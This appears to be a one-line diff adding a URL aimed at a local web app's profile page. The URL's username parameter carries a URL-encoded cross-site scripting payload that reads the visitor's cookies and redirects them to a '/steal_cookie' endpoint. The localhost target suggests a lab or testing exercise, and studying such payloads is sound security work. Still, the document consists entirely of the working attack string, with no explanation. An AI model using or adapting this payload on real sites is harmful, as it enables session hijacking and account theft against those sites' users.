@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=%3Cscript%3Evar+ck%3Ddocument.cookie%3Bwindow.location.replace%28%60%2Fsteal_cookie%3Fcookie%3D%24%7Bck%7D%60%29%3B%3C%2Fscript%3E
